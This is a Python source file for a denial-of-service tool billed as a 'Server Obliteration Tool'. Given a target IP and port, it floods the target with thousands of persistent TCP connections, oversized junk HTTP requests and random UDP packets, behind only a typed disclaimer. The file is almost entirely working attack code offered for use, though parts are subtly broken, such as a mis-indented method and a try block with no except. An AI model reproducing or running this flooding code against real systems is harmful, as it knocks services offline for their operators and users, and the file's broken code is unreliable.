import socket
import threading
import time
import random
import logging
import os
import sys
import resource
from argparse import ArgumentParser

# Configure logging
logging.basicConfig(
    filename='server_stress.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filemode='w'
)

# Global attack parameters
MAX_THREADS = 5000
CONNECTION_COUNT = 0
BYPASS_ATTEMPTS = 0

def display_banner():
    """Display enhanced ASCII banner"""
    banner = r"""
    ██████╗ ██████╗ ██╗  ██╗███████╗██████╗  ██████╗ 
    ██╔══██╗██╔══██╗██║  ██║██╔════╝██╔══██╗██╔═══██╗
    ██████╔╝██████╔╝███████║█████╗  ██████╔╝██║   ██║
    ██╔══██╗██╔══██╗██╔══██║██╔══╝  ██╔══██╗██║   ██║
    ██████╔╝██║  ██║██║  ██║███████╗██║  ██║╚██████╔╝
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ 
    """
    os.system('clear' if os.name == 'posix' else 'cls')
    print(banner)

def increase_limits():
    """Maximize system resource limits"""
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))
    except Exception as e:
        logging.error(f"Limit increase failed: {str(e)}")

class ObliteratorEngine:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.socket_pool = []
        self.active = True

    def create_socket_army(self):
        """Generate persistent socket connections"""
        while self.active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.connect((self.target_ip, self.target_port))
                self.socket_pool.append(s)
                global CONNECTION_COUNT
                CONNECTION_COUNT += 1
                if len(self.socket_pool) > 1000:
                    self.rotate_sockets()
            except Exception as e:
                logging.error(f"Socket creation failed: {str(e)}")
                time.sleep(0.01)

    def rotate_sockets(self):
        """Maintain active connection pool"""
        try:
            dead = [s for s in self.socket_pool if s.fileno() == -1]
            for s in dead:
                self.socket_pool.remove(s)
            while len(self.socket_pool) > 750:
                s = self.socket_pool.pop()
                try:
                    s.close()
                except:
                    pass

     def http_tsunami(self):
        """Generate massive HTTP traffic"""
        while self.active:
            try:
                for s in self.socket_pool:
                    try:
                        s.sendall(self.craft_payload())
                        time.sleep(random.uniform(0.001, 0.01))
                    except:
                        self.rotate_sockets()
            except Exception as e:
                logging.error(f"HTTP flood error: {str(e)}")

    def craft_payload(self):
        """Generate evasive payloads"""
        payload_types = [
            lambda: f"POST /{random.randint(0,10000)} HTTP/1.1\r\nHost: {random.choice(['127.0.0.1', 'localhost', '0.0.0.0'])}\r\nContent-Length: 1000000\r\n\r\n{os.urandom(500000)}".encode(),
            lambda: f"GET /?{os.urandom(16).hex()} HTTP/1.1\r\n".encode() + b"X" * random.randint(2048, 8192),
            lambda: os.urandom(random.randint(1024, 65500))
        ]
        return random.choice(payload_types)()

    def udp_meteor_shower(self):
        """UDP flood subsystem"""
        while self.active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(os.urandom(65500), (self.target_ip, self.target_port))
                global BYPASS_ATTEMPTS
                BYPASS_ATTEMPTS += 1
            except Exception as e:
                logging.error(f"UDP error: {str(e)}")
            finally:
                try:
                    s.close()
                except:
                    pass

def launch_armageddon(target_ip, target_port, duration):
    """Main attack controller"""
    display_banner()
    increase_limits()
    
    print(f"[!] INITIATING SERVER OBLITERATION PROTOCOL [!]")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Estimated destruction time: {duration} seconds\n")
    
    engine = ObliteratorEngine(target_ip, target_port)
    
    # Socket army generator
    threading.Thread(target=engine.create_socket_army, daemon=True).start()
    
    # Launch attack vectors
    vectors = [
        threading.Thread(target=engine.http_tsunami, daemon=True),
        threading.Thread(target=engine.udp_meteor_shower, daemon=True)
    ]
    
    for vector in vectors:
        vector.start()
    
    # Monitoring
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            print(f"\rConnections: {CONNECTION_COUNT} | Bypass attempts: {BYPASS_ATTEMPTS} | Active sockets: {len(engine.socket_pool)}", end="")
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[!] Aborting destruction sequence")
    finally:
        engine.active = False
        time.sleep(2)
        print("\n[+] Obliteration summary:")
        print(f"Total connections: {CONNECTION_COUNT}")
        print(f"UDP bypass packets: {BYPASS_ATTEMPTS}")

if __name__ == "__main__":
    parser = ArgumentParser(description="Server Obliteration Tool")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("-d", "--duration", type=int, default=300, help="Attack duration in seconds")
    
    args = parser.parse_args()
    
    print("[!] WARNING: THIS WILL CAUSE IRREVERSIBLE DAMAGE TO TARGET SYSTEMS [!]")
    print("[!] LEGAL DISCLAIMER: Use only on systems you own and control [!]")
    confirm = input("Type 'I ACCEPT FULL RESPONSIBILITY' to continue: ")
    
    if confirm.strip().upper() != "I ACCEPT FULL RESPONSIBILITY":
        print("Aborting...")
        sys.exit(0)
    
    try:
        launch_armageddon(args.ip, args.port, args.duration)
    except Exception as e:
        print(f"Critical failure: {str(e)}")
        sys.exit(1)
